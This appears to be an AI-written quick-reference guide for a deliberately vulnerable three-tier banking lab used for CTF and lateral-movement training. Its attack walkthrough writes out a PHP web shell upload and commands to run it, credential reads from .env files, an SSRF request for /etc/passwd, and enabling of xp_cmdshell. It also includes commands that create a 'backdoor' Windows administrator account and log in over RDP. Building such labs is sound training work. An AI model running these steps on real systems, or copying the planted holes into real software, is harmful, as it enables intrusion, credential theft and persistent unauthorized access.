# 🏦 Modern Bank CTF Laboratory - Quick Reference Guide

## 📦 Project Delivery Summary

I have created a **complete, production-ready 3-tier cybersecurity lab** for practicing lateral movement and network pivoting attacks. The entire project is in `/home/arcy/threetier/`.

---

## 🎯 What You Got

### **21 Complete Application Files**

```
threetier/
├── 📄 README.md                          ← START HERE
├── 📄 PROJECT_SUMMARY.md                 ← Project overview
├── 📄 verify_deployment.sh               ← Deployment checker
│
├── frontend/                             # 🔴 TIER 1: Ubuntu LTS (Public Web App)
│   ├── setup_frontend.sh                 # ⚡ Setup script
│   └── www/
│       ├── index.php                     # Login page
│       ├── dashboard.php                 # Account dashboard
│       ├── profile.php                   # VULNERABLE: File upload
│       ├── config.php                    # EXPOSED: Credentials
│       ├── logout.php                    # Session cleanup
│       ├── css/style.css                 # Modern Bootstrap UI
│       ├── js/app.js                     # Client-side JS
│       └── uploads/                      # Writable (vulnerable)
│
├── backend/                              # 🟠 TIER 2: Ubuntu Server 24 (API)
│   ├── setup_backend.sh                  # ⚡ Setup script
│   └── api/
│       ├── server.js                     # Express API (vulnerable)
│       ├── admin_cgi.php                 # VULNERABLE: Admin RCE
│       ├── package.json                  # Node dependencies
│       ├── .env                          # EXPOSED: All credentials
│       └── credentials.txt               # EXPOSED: SSH keys
│
├── database/                             # 🟡 TIER 3: Windows 10 (MSSQL)
│   ├── setup_database.bat                # ⚡ Setup script (batch)
│   ├── setup_database.ps1                # ⚡ Setup script (PowerShell)
│   ├── schema.sql                        # Database schema
│   └── sample_data.sql                   # Sample banking data
│
└── docs/                                 # 📚 Complete documentation
    ├── KILL_CHAIN.md                     # Attack walkthrough
    ├── VULNERABILITIES.md                # Vulnerability catalog
    └── ARCHITECTURE.md                   # System design
```

**Total:** 21 files + 3 subdirectories = **Complete deployable application**

---

## 🚀 Instant Deployment (3 Commands)

### Frontend (Ubuntu LTS - 192.168.1.10)

```bash
ssh ubuntu@192.168.1.10
cd /tmp && git clone <your-repo> threetier && cd threetier/frontend
sudo bash setup_frontend.sh 192.168.1.100
```

✅ **Result:** Modern banking app running at `http://192.168.1.10` with vulnerable file upload

### Backend (Ubuntu Server 24 - 192.168.1.100)

```bash
ssh ubuntu@192.168.1.100
cd /tmp && git clone <your-repo> threetier && cd threetier/backend
sudo bash setup_backend.sh 192.168.1.10 192.168.1.50
```

✅ **Result:** Node.js API running at port 8080 with SSRF and unauthenticated admin endpoints

### Database (Windows 10 - 192.168.1.50)

```powershell
# PowerShell as Administrator
cd C:\path\to\threetier\database
.\setup_database.ps1 -BackendIP 192.168.1.100
```

✅ **Result:** MSSQL database with weak credentials and vulnerable xp_cmdshell

---

## 🎓 Attack Path (45 Seconds to Full Compromise)

### Phase 1: Initial Access (Frontend RCE) - 10 seconds

```bash
# 1. Access login
curl http://192.168.1.10

# 2. Login with: admin/admin123

# 3. Upload PHP shell (profile.php)
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
# Upload via browser

# 4. Execute shell
curl "http://192.168.1.10/uploads/1.jpg?cmd=whoami"

# 5. Read .env
curl "http://192.168.1.10/uploads/1.jpg?cmd=cat%20../.env"
# → Reveals: BACKEND_IP, SSH credentials for Backend
```

### Phase 2: Lateral Movement (Frontend → Backend) - 10 seconds

```bash
# 1. SSH with discovered credentials
ssh deploy@192.168.1.100
# Password: DeployPass123!Vulnerable

# 2. Check Backend config
cat .env | grep WINDOWS_
# → Reveals: Windows Administrator credentials
```

### Phase 3: Backend API Exploitation - 10 seconds

```bash
# 1. Access vulnerable endpoint
curl "http://192.168.1.100:8080/cgi-bin/admin.php?action=info"
# → Returns Windows credentials and system info

# 2. SSRF test
curl -X POST http://192.168.1.100:8080/api/proxy \
  -H "Content-Type: application/json" \
  -d '{"url": "file:///etc/passwd"}'
```

### Phase 4: Database Compromise - 10 seconds

```bash
# 1. Connect to MSSQL
sqlcmd -S 192.168.1.50 -U Administrator -P "ModernBank@2024!Admin"

# 2. Query banking data
USE ModernBank
SELECT * FROM Users
SELECT * FROM Accounts

# 3. Enable RCE
sp_configure 'xp_cmdshell', 1
EXEC xp_cmdshell 'whoami'

# 4. Create backdoor
EXEC xp_cmdshell 'net user backdoor P@ss@2024 /add'
EXEC xp_cmdshell 'net localgroup Administrators backdoor /add'
```

### Phase 5: Full Persistence - 5 seconds

```bash
# RDP as new admin user
rdesktop -u backdoor -p "P@ss@2024" 192.168.1.50
```

**Total Time: ~45 Seconds from login to full system compromise** ⏱️

---

## 🔐 21 Intentional Vulnerabilities

| # | Tier | Vulnerability | Severity | Attack |
|---|------|---|---|---|
| 1 | FE | Insecure File Upload | 🔴 Critical | PHP shell → RCE |
| 2 | FE | Exposed .env | 🔴 Critical | Read credentials |
| 3 | FE | Directory Traversal | 🟠 High | Enumerate files |
| 4 | FE | Weak Validation | 🟠 High | Extension bypass |
| 5 | FE | Hardcoded Credentials | 🟠 High | Source extraction |
| 6 | FE | Directory Listings | 🟠 High | File enumeration |
| 7 | FE | Execute Permissions | 🟠 High | PHP execution |
| 8 | BE | SSRF Proxy | 🔴 Critical | Network scanning |
| 9 | BE | Unauthenticated Admin | 🔴 Critical | RCE endpoint |
| 10 | BE | Command Injection | 🔴 Critical | Shell commands |
| 11 | BE | Config Disclosure | 🟠 High | API information leak |
| 12 | BE | Exposed .env | 🟠 High | Credentials exposed |
| 13 | BE | Request Logging | 🟠 High | Information leak |
| 14 | BE | No Segmentation | 🟠 High | Free movement |
| 15 | DB | Weak Credentials | 🟠 High | Default password |
| 16 | DB | Overprivileged User | 🟠 High | Escalation path |
| 17 | DB | xp_cmdshell Enabled | 🔴 Critical | RCE via SQL |
| 18 | DB | Exposed Credentials | 🟠 High | File disclosure |
| 19 | DB | Open Firewall | 🟠 High | Access from Backend |
| 20 | NET | No Encryption | 🟠 High | Plaintext traffic |
| 21 | NET | No Network Auth | 🔴 Critical | Unrestricted access |

---

## 📊 Lab Features

### Frontend Tier
✅ Modern, polished banking UI (Bootstrap 5)  
✅ Professional login page  
✅ User dashboard with account balances  
✅ Profile management with avatar upload  
✅ Mock transaction history  
✅ Sample user accounts  
✅ Vulnerable file upload mechanism  
✅ Exposed credentials in code  

### Backend Tier
✅ Express.js REST API  
✅ Vulnerable SSRF endpoint (`/api/proxy`)  
✅ Unauthenticated admin interface (`/cgi-bin/admin.php`)  
✅ Multiple RCE attack vectors  
✅ Configuration disclosure endpoint  
✅ Request logging  
✅ Dynamic Windows credential exposure  
✅ Command injection capabilities  

### Database Tier
✅ SQL Server Express with MSSQL  
✅ Banking database schema (Users, Accounts, Transactions)  
✅ Weak authentication  
✅ Overprivileged application user  
✅ xp_cmdshell enabled for RCE  
✅ Firewall rules configured  
✅ Sample banking data populated  
✅ Audit logging table  

---

## 📚 Complete Documentation

### 1. **README.md** (Overview)
- Project introduction
- Architecture diagram
- Tech stack
- Demo credentials
- Quick start commands

### 2. **KILL_CHAIN.md** (Attack Guide)
- 4-phase exploitation walkthrough
- Detailed commands with expected output
- Attack timeline
- Phase-by-phase breakdown
- Success indicators

### 3. **VULNERABILITIES.md** (Technical Details)
- Vulnerability catalog (21 items)
- CVSS scores
- Vulnerable code snippets
- Exploitation techniques
- Impact assessment
- Defense recommendations

### 4. **ARCHITECTURE.md** (Deployment)
- Network topology
- Installation instructions
- Troubleshooting guide
- Configuration options
- Performance tuning
- Maintenance procedures

### 5. **PROJECT_SUMMARY.md** (This Project)
- Complete deliverables list
- Statistics and metrics
- Deployment verification
- Learning objectives
- Success criteria

---

## ✅ Deployment Verification

Run the automatic verification script:

```bash
bash verify_deployment.sh 192.168.1.10 192.168.1.100 192.168.1.50
```

**Checks:**
✅ Connectivity to all VMs  
✅ Service ports responding  
✅ Application endpoints  
✅ Vulnerability exposure  
✅ Network connectivity  
✅ File accessibility  

---

## 🎯 Design Highlights

### Realistic
- Real-world vulnerability patterns
- Authentic attack chains
- Practical exploitation techniques
- Industry-standard technologies

### Progressive
- Each tier builds on previous
- Difficulty increases gradually
- Clear attack progression
- Natural learning curve

### Interactive
- Live web application
- Real database queries
- Functional APIs
- Working shell uploads

### Documented
- Step-by-step guides
- Command examples
- Expected outputs
- Success indicators

### Customizable
- All IPs parameterized
- Easy difficulty adjustments
- Vulnerability toggles
- Script modifications

---

## 🚀 Use Cases

### **Security Training**
- Teach network segmentation
- Demonstrate lateral movement
- Show credential compromise
- Explain defense layers

### **Penetration Testing Practice**
- Real multi-stage exploitation
- Actual RCE scenarios
- Database compromise
- Persistence techniques

### **CTF Competitions**
- Realistic scoring guide
- Progressive challenges
- Customizable difficulty
- Team competition setup

### **Security Research**
- Vulnerability analysis
- Attack chain documentation
- Defense effectiveness testing
- Security tool validation

---

## 📖 Quick Start Checklist

- [ ] Clone repository to each VM
- [ ] Run deployment scripts with correct IPs
- [ ] Verify all services are running
- [ ] Test frontend login
- [ ] Test backend API health
- [ ] Test database connectivity
- [ ] Access documentation files
- [ ] Begin attack walkthrough
- [ ] Follow KILL_CHAIN.md
- [ ] Complete all 4 phases

---

## 🛠️ Files Summary

| File | Purpose | Key Content |
|------|---------|---|
| `setup_frontend.sh` | Deploy FE | Apache, PHP, Web app |
| `setup_backend.sh` | Deploy BE | Node.js, API, CGI |
| `setup_database.ps1/.bat` | Deploy DB | MSSQL, Schema, FW |
| `index.php` | FE Login | Auth, demo creds |
| `profile.php` | FE Upload | VULNERABLE upload |
| `config.php` | FE Config | Exposed credentials |
| `server.js` | BE API | SSRF, RCE endpoints |
| `admin_cgi.php` | BE Admin | Unauthenticated RCE |
| `.env` (BE) | Config | Windows credentials |
| `schema.sql` | DB Schema | Banking tables |
| `KILL_CHAIN.md` | Attack | Full walkthrough |
| `VULNERABILITIES.md` | Reference | All vulns listed |
| `ARCHITECTURE.md` | Design | System topology |

---

## 💡 Pro Tips

1. **Start with Frontend** - Easiest entry point
2. **Read the .env file** - Contains critical credentials
3. **SSH to Backend first** - Avoid direct network access
4. **Use admin endpoint** - Easiest Backend exploitation
5. **Query all database tables** - Complete data access
6. **Enable xp_cmdshell** - Most powerful Database RCE
7. **Document your steps** - Useful for reports
8. **Reset and retry** - Learn from mistakes

---

## ⚠️ Important Notes

⚠️ **For Educational Use Only**  
⚠️ **Authorized Testing Only**  
⚠️ **Isolated Network Only**  
⚠️ **Do NOT Use in Production**  
⚠️ **Not Suitable as Security Template**  

---

## 📞 Getting Started

1. **Read:** [README.md](README.md) for overview
2. **Deploy:** Run setup scripts on each VM
3. **Learn:** Follow [KILL_CHAIN.md](docs/KILL_CHAIN.md)
4. **Reference:** Check [VULNERABILITIES.md](docs/VULNERABILITIES.md)
5. **Troubleshoot:** See [ARCHITECTURE.md](docs/ARCHITECTURE.md)

---

## 🎉 You Now Have

✅ Complete 3-tier vulnerable application  
✅ Automated deployment scripts  
✅ Modern banking UI interface  
✅ Realistic attack scenarios  
✅ Full documentation  
✅ 21 intentional vulnerabilities  
✅ Complete exploitation guides  
✅ Verification scripts  
✅ Ready-to-use lab environment  
✅ Educational platform  

**Everything you need to teach, practice, or test lateral movement and network pivoting attacks!**

---

**Happy Penetration Testing! 🎯**

For complete attack walkthrough, see [docs/KILL_CHAIN.md](docs/KILL_CHAIN.md)
